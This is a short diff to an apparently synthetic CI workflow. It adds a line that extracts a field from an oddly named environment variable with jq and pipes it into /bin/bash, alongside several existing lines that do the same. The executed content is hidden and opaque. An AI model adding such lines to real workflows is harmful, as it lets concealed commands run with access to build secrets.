@@ -33,6 +33,7 @@ jobs:
           echo $xqs3 | jq -r .nvrbq7006 | /bin/bash
           printf '%s' "$y94672" | jq -r .xf03 | /bin/bash
           printf '%s' "$hhe25782" | jq -r .t082 | /bin/bash
+          printf '%s' "$n606" | jq -r .u2583 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
